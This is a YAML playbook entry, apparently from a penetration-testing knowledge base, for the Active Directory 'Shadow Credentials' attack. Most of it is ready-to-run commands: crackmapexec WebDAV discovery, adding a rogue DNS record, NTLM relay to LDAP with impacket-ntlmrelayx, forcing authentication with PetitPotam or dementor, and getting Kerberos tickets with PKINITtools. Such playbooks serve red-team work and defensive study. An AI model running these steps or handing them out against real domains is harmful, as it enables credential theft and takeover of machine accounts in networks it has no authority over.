title: Shadow Credentials Attack
category: 
  - AD:
    - NTLM
tactic: Credential Access
tags: []
description: |
  Users or computer accounts can have several key credentials which could correspond to different devices. 
  The information is stored in the msDS-KeyCredentialLink active directory attribute and was introduced in 
  Windows Server 2016 and Windows 10 1703 (Windows Hello new attack surface).

  Requirements:
  Domain should support PKINIT and contain at least one Domain Controller running Windows Server 2016 or above.
  Domain Controller should have its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled 
  or when a certificate authority (CA) is in place).
  The attacker`s host should have a valid DNS entry (it`s also possible to use spoofing techniques)
  WebClient service should be installed and running (by default the service is not installed on servers, 
  so in most cases it works just for workstations)


references:
  - https://pentestlab.blog/2022/02/07/shadow-credentials/

steps:

  - description: Check for enabled webdav services
    options: 
      - tool: crackmapexec
        usage: 
          crackmapexec smb smb_hosts.txt -u user -d domain.com -p 'P@ssw0rd' -M webdav
        comments: 

  - description: Create a new DNS record in the AD
    options: 
      - tool: dnstool.py
        usage: 
          dnstool.py -u 'domain.com\user' -p 'Password123' --record 'shadow' --action add --data <attackers_ip> dc01.domain.com
        comments: it takes some time to update, wait for 5 minutes or so
    
  - description: Prepare a tool to relay the authentication request
    options: 
      - tool: impacket-ntlmrelayx
        usage: 
          impacket-ntlmrelayx -t ldap://dc02.hpbank.local --shadow-credentials --shadow-target adcs\$
        comments: 
  
  - description: Force the target host to authenticate using WebDAV (http request)
    options: 
      - tool: dementor.py
        usage: python2 dementor.py -d hpbank.local -u da -p 'P@ssw0rd' shadow@80/test.txt <target_hostname>
        comments: 
      
      - tool: PetitPotam.py (topotam)
        usage: PetitPotam.py -u da -p 'P@ssw0rd' -d domain.local shadow@80/test.txt <target.domain.local> -pipe all
        comments: 
  
  - description: Request a TGT using the PFX file received from the impacket-ntlmrelayx tool
    options: 
      - tool: PKINITtools/gettgtpkinit.py
        usage: gettgtpkinit.py -cert-pfx <certname.pfx> -pfx-pass <pfx_pass> domain.com/servername$ <cachefile.ccache>
        comments: 
  
  - description: Request a service ticket that is valid on the host for which you've obtained a certificate
    options: 
      - tool: PKINITtools/gets4uticket.py
        usage: python3 PKINITtools/gets4uticket.py kerberos+ccache://hpbank.local\adcs\$:7KJqDL8U.ccache@dc01.hpbank.local cifs/adcs.hpbank.local
        comments: 
  
  - description: Use any tool supported kerberos auth
    options: 
      - tool: 
        usage: 
        comments: 
          
comments:
  